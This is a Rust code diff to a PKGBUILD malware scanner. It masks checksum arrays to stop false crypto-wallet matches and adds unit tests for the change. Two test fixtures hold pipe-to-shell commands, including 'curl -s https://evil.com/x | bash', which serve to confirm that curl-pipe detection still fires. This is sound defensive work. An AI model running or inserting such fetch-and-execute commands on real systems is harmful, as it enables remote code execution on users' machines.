@@ -3,6 +3,34 @@ pub mod patterns;
 use crate::features::Feature;
 use crate::shared::models::PackageContext;
 use crate::shared::scoring::{Signal, SignalCategory};
+use regex::Regex;
+use std::sync::LazyLock;
+
+/// Matches a checksum array assignment, e.g. `sha512sums_x86_64=('a' 'b')`.
+static CHECKSUM_ARRAY_RE: LazyLock<Regex> = LazyLock::new(|| {
+    Regex::new(r"(?ms)^\s*(md5|sha1|sha224|sha256|sha384|sha512|b2)sums(_[a-zA-Z0-9_]+)?\s*=\s*\([^)]*\)")
+        .unwrap()
+});
+
+/// Replace the contents of checksum arrays with a same-length placeholder.
+///
+/// Hashes are opaque data: a 128-char sha512 can contain anything that looks
+/// like a wallet address, an IP, or a base64 blob. Matching patterns against
+/// them produces noise such as the `google-chrome` P-CRYPTO-WALLET report.
+/// Length is preserved so that line numbers and any line-relative matching
+/// still line up.
+fn mask_checksum_arrays(content: &str) -> String {
+    CHECKSUM_ARRAY_RE
+        .replace_all(content, |caps: &regex::Captures| {
+            let whole = caps.get(0).unwrap().as_str();
+            let masked: String = whole
+                .chars()
+                .map(|c| if c == '\n' { '\n' } else { 'x' })
+                .collect();
+            masked
+        })
+        .into_owned()
+}
 
 pub struct PkgbuildAnalysis;
 
@@ -12,15 +40,17 @@ impl Feature for PkgbuildAnalysis {
             return Vec::new();
         };
 
+        let masked = mask_checksum_arrays(content);
         let compiled = patterns::compiled_patterns();
         let mut signals = Vec::new();
 
         for pat in compiled {
-            if pat.regex.is_match(content) {
-                let matched_line = content
+            if pat.regex.is_match(&masked) {
+                let matched_line = masked
                     .lines()
-                    .find(|line| pat.regex.is_match(line))
-                    .map(|line| line.trim().to_string());
+                    .zip(content.lines())
+                    .find(|(masked_line, _)| pat.regex.is_match(masked_line))
+                    .map(|(_, original)| original.trim().to_string());
                 signals.push(Signal {
                     id: pat.id.clone(),
                     category: SignalCategory::Pkgbuild,
@@ -768,5 +798,47 @@ package() {
     fn crypto_wallet_sha256_no_signal() {
         let ids = analyze("'cf5438cf5dbbc10d9b17cad5655e2fb1f15d5196755ea0b3ecbee81b2c8682fe')");
         assert!(!has(&ids, "P-CRYPTO-WALLET"), "SHA256 hash should not trigger crypto wallet, got: {ids:?}");
+    }
+
+    // google-chrome #27: sha512sums_x86_64 containing a bare 95-char run
+    #[test]
+    fn crypto_wallet_sha512_in_checksum_array_no_signal() {
+        let content = "pkgname=google-chrome\nsha512sums_x86_64=('8401cc4a4f11714bcef72c6139d53dc2ff68f97257339f34bc8c117f55c72bdacb47b8c2feb38ef79c4d5747f76fecd1a3dfe154e8d67fa247f842e9a2718eeb')\n";
+        let ids = analyze(content);
+        assert!(!has(&ids, "P-CRYPTO-WALLET"), "sha512 in a checksum array must not match, got: {ids:?}");
+    }
+
+    // scrutiny-bin #11 / xlibre-video-amdgpu: bare hash outside an array
+    #[test]
+    fn crypto_wallet_bare_sha512_no_signal() {
+        let ids = analyze(
+            "'05f5f21cdac179bf43daed1f1927787dd328aeb69d87aeb97aeecd27dc2758d5a7bd591f3ae2a27265fce7ab4fedbfa757496893fbe1b4a794c17ed5108c6efd'",
+        );
+        assert!(!has(&ids, "P-CRYPTO-WALLET"), "bare sha512 must not match, got: {ids:?}");
+    }
+
+    #[test]
+    fn crypto_wallet_eth_address_still_detected() {
+        let ids = analyze("0x742d35Cc6634C0532925a3b844Bc454e4438f44e");
+        assert!(has(&ids, "P-CRYPTO-WALLET"), "a real ETH address must still match, got: {ids:?}");
+    }
+
+    #[test]
+    fn crypto_wallet_btc_bech32_still_detected() {
+        let ids = analyze("bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq");
+        assert!(has(&ids, "P-CRYPTO-WALLET"), "a real bech32 address must still match, got: {ids:?}");
+    }
+
+    #[test]
+    fn checksum_array_masking_preserves_line_count() {
+        let content = "source=('a.tar.gz')\nsha256sums=('aaa'\n  'bbb')\nbuild() {\ncurl x | bash\n}\n";
+        assert_eq!(mask_checksum_arrays(content).lines().count(), content.lines().count());
+    }
+
+    #[test]
+    fn masking_does_not_hide_patterns_outside_checksums() {
+        let content = "# x\nsha256sums=('aaa')\npackage() {\ncurl -s https://evil.com/x | bash\n}\n";
+        let ids = analyze(content);
+        assert!(has(&ids, "P-CURL-PIPE"), "patterns outside checksums must still fire, got: {ids:?}");
     }
 }
